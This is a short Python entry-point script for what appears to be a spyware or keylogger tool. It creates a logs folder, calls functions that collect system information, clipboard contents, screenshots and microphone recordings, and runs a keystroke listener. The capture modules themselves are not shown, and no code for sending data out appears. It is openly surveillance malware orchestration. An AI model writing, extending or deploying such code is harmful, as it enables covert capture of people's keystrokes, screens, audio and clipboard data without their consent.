import os
from keylogger import listener
from system_info import get_system_info
from clipboard import get_clipboard
from screenshot import capture_screenshots
from mic_record import record_mic
from time import sleep

if not os.path.exists("logs"):
  os.makedirs("logs")


get_system_info()
get_clipboard()
capture_screenshots()
record_mic()

listener.join()